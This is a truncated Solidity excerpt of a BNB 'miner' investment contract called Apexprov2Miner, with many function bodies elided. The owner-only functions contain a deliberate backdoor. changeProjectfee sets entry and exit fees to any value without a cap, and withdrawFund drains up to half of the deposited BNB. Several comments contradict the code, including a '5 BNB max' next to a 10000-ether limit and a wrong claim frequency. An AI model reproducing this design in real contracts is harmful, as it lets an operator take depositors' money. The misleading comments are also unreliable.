...
contract Apexprov2Miner is Ownable {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.005 ether; // Min 0.005 bnb 
    uint256          public MAX_WITHDRAW_AMOUNT = 10000 ether; // claim 5 BNB max
	uint256[] public REFERRAL_PERCENTS = [500, 0, 0, 0, 0, 0, 0, 0, 0, 0];
	uint256[] public SEED_PERCENTS = [500, 100, 100, 100, 100, 100, 100, 100, 100, 100];
	uint256          public PROJECTIN_FEE = 900;
    uint256          public PROJECTOUT_FEE = 200;
    uint256 constant public MARKETIN_FEE = 400;
    uint256 constant public MARKETOUT_FEE = 600;
	uint256 constant public DEVIN_FEE = 200;
    uint256 constant public DEVOUT_FEE = 700;
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256          public	WITHDRAW_COOLDOWN = 1 days; // claim 3 time per day
  ...
  function reinvest() public {
	...
	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 totalReinvest) {
    ...
    function changeClaimtimer(uint256 cooldown) public onlyOwner {
     ...
     function changeProjectfee(uint256 feein, uint256 feeout ) public onlyOwner {
		PROJECTIN_FEE = feein;
        PROJECTOUT_FEE = feeout;
	}


    function withdrawFund(uint256 amount) public onlyOwner {
         uint256 contractBnb = address(this).balance;
         require(amount <= contractBnb.div(2));
         require(_canClaim(msg.sender), "Claim cooldown");
